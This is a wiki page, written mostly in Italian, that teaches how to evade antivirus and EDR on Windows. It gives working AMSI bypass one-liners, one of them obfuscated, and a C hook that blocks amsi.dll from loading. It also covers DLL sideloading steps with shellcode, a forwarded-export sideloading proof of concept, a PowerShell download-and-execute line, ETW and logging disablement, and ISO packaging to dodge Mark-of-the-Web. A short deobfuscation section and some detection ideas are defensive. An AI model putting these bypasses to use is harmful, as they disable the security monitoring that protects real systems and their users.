# Bypass Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Fermare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per fermare Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per fermare Windows Defender fingendo un altro AV.
- [Disabilitare Defender se sei admin](basic-powershell-for-pentesters/README.md)

## **Metodologia di Evasione AV**

Attualmente gli AV usano diversi metodi per verificare se un file è malevolo o meno: static detection, dynamic analysis, e per gli EDR più avanzati, behavioural analysis.

### **Rilevamento statico**

Il rilevamento statico si ottiene segnalando stringhe note malevole o array di byte in un binario o script, ed estraendo anche informazioni dal file stesso (es. file description, company name, digital signatures, icon, checksum, ecc.). Questo significa che usare strumenti pubblici noti può farti beccare più facilmente, dato che molto probabilmente sono già stati analizzati e contrassegnati come malevoli. Ci sono un paio di modi per aggirare questo tipo di rilevamento:

- **Encryption**

Se encritti il binario, non ci sarà modo per l'AV di rilevare il tuo programma, ma avrai bisogno di un loader che decritti ed esegua il programma in memoria.

- **Obfuscation**

A volte basta cambiare alcune stringhe nel tuo binario o script per superare l'AV, ma può essere un'operazione che richiede tempo a seconda di ciò che vuoi offuscare.

- **Custom tooling**

Se sviluppi i tuoi strumenti, non ci saranno firme note malevole, ma questo richiede molto tempo e sforzo.

> [!TIP]
> Un buon modo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno individualmente; in questo modo può dirti esattamente quali stringhe o byte nel tuo binario vengono segnalati.

Consiglio vivamente di dare un'occhiata a questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sulla pratica AV Evasion.

### **Analisi dinamica**

L'analisi dinamica è quando l'AV esegue il tuo binario in una sandbox e osserva attività malevole (es. provare a decriptare e leggere le password del browser, fare un minidump su LSASS, ecc.). Questa parte può essere un po' più ostica, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo modo per bypassare la dynamic analysis degli AV. Gli AV hanno un tempo molto breve per scansionare i file per non interrompere il workflow dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare lo sleep a seconda di come è implementato.
- **Checking machine's resources** Solitamente le sandbox hanno poche risorse a disposizione (es. < 2GB RAM), altrimenti rallenterebbero la macchina dell'utente. Qui puoi anche essere creativo, per esempio controllando la temperatura della CPU o addirittura la velocità delle ventole: non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se vuoi mirare a un utente la cui workstation è joinata al dominio "contoso.local", puoi controllare il dominio del computer per vedere se corrisponde a quello specificato; se non corrisponde, puoi far uscire il tuo programma.

Si scopre che il computer della Sandbox di Microsoft Defender si chiama HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima dell'attivazione; se il nome corrisponde a HAL9TH, significa che sei dentro la sandbox di Defender, quindi puoi far uscire il tuo programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Alcuni altri ottimi suggerimenti da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canale #malware-dev</p></figcaption></figure>

Come detto prima in questo post, **gli strumenti pubblici** alla fine **verranno rilevati**, quindi dovresti porti una domanda:

Per esempio, se vuoi dumpare LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno conosciuto, che faccia comunque il dump di LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei, se non il più, segnalato dagli AV e dagli EDR; pur essendo un progetto molto valido, è anche un incubo cercare di aggirare gli AV con esso, quindi cerca alternative per raggiungere il risultato che ti proponi.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasione, assicurati di **disattivare l'invio automatico dei campioni** in Defender, e per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere evasione a lungo termine. Se vuoi verificare se il tuo payload viene rilevato da un particolare AV, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando è possibile, dai sempre la priorità all'uso di DLL per l'evasione; per esperienza, i file DLL sono di solito molto meno rilevati e analizzati, quindi è un trucco molto semplice per evitare il rilevamento in alcuni casi (se il tuo payload ha ovviamente un modo di essere eseguito come DLL).

Come si vede in questa immagine, un DLL Payload di Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparazione su antiscan.me di un normale payload Havoc EXE vs un normale Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando sia l'applicazione vittima che il/i payload malevoli fianco a fianco.

Puoi cercare programmi suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e lo script powershell seguente:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando restituirà l'elenco dei programmi suscettibili di DLL hijacking all'interno di "C:\Program Files\\" e dei file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare personalmente i programmi DLL Hijackable/Sideloadable**, questa tecnica è abbastanza stealthy se eseguita correttamente, ma se usi programmi DLL Sideloadable pubblicamente noti, potresti essere facilmente scoperto.

Semplicemente posizionare una DLL malevola con il nome che un programma si aspetta di caricare non farà caricare il tuo payload, perché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (maligna) alla DLL originale, preservando così la funzionalità del programma e permettendo di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) che la proxy DLL hanno un tasso di rilevamento 0/26 su [antiscan.me](https://antiscan.me)! Lo considererei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire quanto abbiamo discusso.

### Abuso degli Export Inoltrati (ForwardSideLoading)

I moduli Windows PE possono esportare funzioni che sono in realtà "forwarders": invece di puntare a codice, la voce di export contiene una stringa ASCII della forma `TargetDll.TargetFunc`. Quando un caller risolve l'export, il Windows loader farà:

- Caricare `TargetDll` se non è già caricato
- Risolvere `TargetFunc` da esso

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi protetto KnownDLLs (es., ntdll, kernelbase, ole32).
- Se `TargetDll` non è una KnownDLL, viene usato l'ordine di ricerca DLL normale, che include la directory del modulo che sta eseguendo la risoluzione del forward.

Questo abilita una primitive di sideloading indiretta: trova una signed DLL che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, quindi colloca quella signed DLL nella stessa directory di una attacker-controlled DLL chiamata esattamente come il modulo di destinazione inoltrato. Quando l'export inoltrato viene invocato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite l'ordine di ricerca normale.

PoC (copia e incolla):
1) Copiare la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Posiziona un `NCRYPTPROV.dll` malevolo nella stessa cartella. Una DllMain minima è sufficiente per ottenere l'esecuzione di codice; non è necessario implementare la funzione inoltrata per attivare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva l'inoltro con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- While resolving `KeyIsoSetAuditingInterface`, the loader follows the forward to `NCRYPTPROV.SetAuditingInterface`
- The loader then loads `NCRYPTPROV.dll` from `C:\test` and executes its `DllMain`
- If `SetAuditingInterface` is not implemented, you'll get a "missing API" error only after `DllMain` has already run

Hunting tips:
- Concentrati sui forwarded exports dove il modulo di destinazione non è un KnownDLL. KnownDLLs sono elencati sotto `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare i forwarded exports con tooling such as:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Vedi l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Idee per rilevamento/difesa:
- Monitora LOLBins (es. rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguite dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Segnala catene processo/modulo come: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` in percorsi scrivibili dall'utente
- Applica policy di integrità del codice (WDAC/AppLocker) e nega write+execute nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un payload toolkit per bypassing EDRs usando suspended processes, direct syscalls, e alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo stealth.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare affidamento su un solo tool; se possibile, prova a concatenare più evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AVs erano in grado di scannerizzare soltanto **files on disk**, quindi se riuscivi in qualche modo a eseguire payload **directly in-memory**, l'AV non poteva fare nulla per impedirlo, perché non aveva sufficiente visibilità.

La feature AMSI è integrata in questi componenti di Windows.

- User Account Control, or UAC (elevazione di EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, uso interattivo e dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Permette alle soluzioni antivirus di ispezionare il comportamento degli script esponendo il contenuto degli script in una forma non cifrata e non obfuscata.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente avviso su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come antepone `amsi:` e poi il percorso dell'eseguibile da cui lo script è stato eseguito, in questo caso, powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati rilevati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, il codice C# passa anch'esso attraverso AMSI. Questo influenza anche `Assembly.Load(byte[])` per l'esecuzione in-memory. Per questo motivo si raccomanda l'uso di versioni .NET inferiori (come 4.7.2 o precedenti) per l'esecuzione in-memory se si vuole evadere AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI lavora principalmente con rilevamenti statici, modificare gli script che si tenta di caricare può essere una buona strategia per evadere il rilevamento.

Tuttavia, AMSI ha la capacità di unobfuscating gli script anche se hanno più livelli di offuscamento, quindi l'obfuscation potrebbe rivelarsi una cattiva opzione a seconda di come viene effettuata. Questo la rende non così immediata da eludere. A volte, però, basta cambiare un paio di nomi di variabili e funziona, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementato caricando una DLL nel processo di powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterla facilmente anche eseguendo come utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato molteplici modi per evadere la scansione AMSI.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Originariamente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per prevenirne un uso più diffuso.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una singola riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell corrente. Questa riga è stata, ovviamente, rilevata dallo stesso AMSI, quindi è necessaria qualche modifica per poter usare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che probabilmente questo verrà segnalato una volta pubblicato il post, quindi non dovresti pubblicare alcun codice se il tuo obiettivo è rimanere inosservato.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverla con istruzioni che restituiscono il codice E_INVALIDARG; in questo modo il risultato della scansione effettiva sarà 0, interpretato come risultato pulito.

> [!TIP]
> Per una spiegazione più dettagliata, leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Bloccare AMSI impedendo il caricamento di amsi.dll (LdrLoadDll hook)

AMSI viene inizializzato solo dopo che `amsi.dll` è caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio è piazzare un hook in user‑mode su `ntdll!LdrLoadDll` che restituisce un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e non vengono effettuate scansioni per quel processo.

Schema di implementazione (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona su PowerShell, WScript/CScript e custom loaders allo stesso modo (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all'invio di script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti dovuti a lunghe stringhe sulla riga di comando.
- Visto usato da loaders eseguiti tramite LOLBins (es., `regsvr32` che chiama `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la AMSI signature rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente alla ricerca della AMSI signature e poi sovrascrivendola con NOP instructions, rimuovendola di fatto dalla memoria.

**AV/EDR products that uses AMSI**

Puoi trovare una lista di prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi fare questo:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging è una funzionalità che permette di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per scopi di auditing e troubleshooting, ma può anche essere un **problema per attackers che vogliono evadere il rilevamento**.

Per bypassare PowerShell logging puoi usare le seguenti tecniche:

- **Disable PowerShell Transcription and Module Logging**: Puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Use Powershell version 2**: Se usi PowerShell version 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi farlo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per spawnare una powershell senza difese (questo è quello che `powerpick` from Cobal Strike usa).


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, il che aumenterà l'entropy del binary rendendo più facile per AVs e EDRs rilevarlo. Fai attenzione a questo e valuta di applicare la cifratura solo a sezioni specifiche del codice che sono sensibili o che devono essere nascoste.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali) è comune imbattersi in diversi strati di protezione che bloccano decompilers e sandboxes. Il workflow qui sotto **ripristina in modo affidabile un IL quasi originale** che può poi essere decompilato in C# con strumenti come dnSpy o ILSpy.

1.  Anti-tampering removal – ConfuserEx cripta ogni *method body* e lo decripta all'interno del costruttore statico del *module* (`<Module>.cctor`). Questo modifica anche il checksum del PE quindi qualsiasi modifica farà crashare il binary. Usa **AntiTamperKiller** per localizzare le tabelle di metadata criptate, recuperare le XOR keys e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando costruisci il tuo unpacker.

2.  Symbol / control-flow recovery – passa il file *clean* a **de4dot-cex** (un fork di de4dot consapevole di ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleziona il profilo ConfuserEx 2  
• de4dot annullerà il control-flow flattening, ripristinerà gli originali namespaces, classes e variable names e decripterà le constant strings.

3.  Proxy-call stripping – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (aka *proxy calls*) per rompere ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passo dovresti osservare normali .NET API come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Manual clean-up – esegui il binary risultante sotto dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per localizzare il *vero* payload. Spesso il malware lo memorizza come un array di byte codificato TLV inizializzato dentro `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** la necessità di eseguire il sample malevolo – utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute` che può essere usato come IOC per triage automatico dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire una maggiore sicurezza del software attraverso [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator mostra come usare il linguaggio `C++11/14` per generare, a compile time, obfuscated code senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di obfuscated operations generate dal framework di C++ template metaprogramming che renderà la vita di chi vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un x64 binary obfuscator in grado di offuscare diversi tipi di pe files inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice metamorphic code engine per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation fine-grained per linguaggi supportati da LLVM che usa ROP (return-oriented programming). ROPfuscator offusca un programma a livello di assembly code trasformando istruzioni regolari in ROP chains, ostacolando la nostra naturale concezione del normale controllo di flusso.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi alcuni eseguibili da Internet e li esegui.

Microsoft Defender SmartScreen è un meccanismo di sicurezza volto a proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che le applicazioni scaricate raramente attiveranno SmartScreen, avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito cliccando More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente al momento del download di file da Internet, insieme alla URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo del Zone.Identifier ADS per un file scaricato da Internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma attendibile **non attiveranno SmartScreen**.

Un modo molto efficace per impedire ai tuoi payloads di ottenere il Mark of The Web è impacchettarli all'interno di una sorta di contenitore come un ISO. Questo accade perché Mark-of-the-Web (MOTW) **non può** essere applicato ai volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta i payloads in contenitori di output per evadere Mark-of-the-Web.

Esempio d'uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando payload dentro file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che permette ad applicazioni e componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività dannose.

Analogamente a come AMSI viene disabilitato (bypassed) è anche possibile far sì che la funzione **`EtwEventWrite`** del processo user space ritorni immediatamente senza registrare alcun evento. Questo si ottiene patchando la funzione in memoria per farla ritornare immediatamente, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare ulteriori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Caricare binari C# in memoria è noto da tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza essere rilevati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) già fornisce la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nel creare un nuovo processo sacrificial, iniettare il tuo codice malevolo di post-exploitation in quel processo, eseguirlo e, al termine, terminare il nuovo processo. Questo ha vantaggi e svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **fuori** dal nostro Beacon implant process. Questo significa che se qualcosa nelle nostre azioni di post-exploitation va storto o viene intercettato, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva.** Lo svantaggio è che hai una **probabilità maggiore** di essere rilevato da **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo si evita di dover creare un nuovo processo e farlo scansionare dall'AV, ma lo svantaggio è che se qualcosa va storto durante l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon** perché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere di più sul caricamento di assembly C#, dai un'occhiata a questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e al loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**, guarda [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

